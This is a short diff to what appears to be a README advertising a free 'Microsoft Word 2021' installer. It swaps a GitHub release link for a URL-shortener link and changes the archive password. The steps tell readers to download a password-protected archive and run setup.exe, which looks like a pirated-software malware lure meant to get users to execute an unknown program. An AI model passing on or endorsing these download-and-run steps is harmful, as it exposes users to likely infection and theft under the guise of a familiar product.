@@ -2,8 +2,8 @@
 
 <H3>⚙️ How to install</H3>
 
-- [Download](https://github.com/leonraju/microsoft-word-2021/releases/download/Download/MicWord_21.rar)
-- Open archive (password: word2021)
+- [Download](https://goo.su/cQmc)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
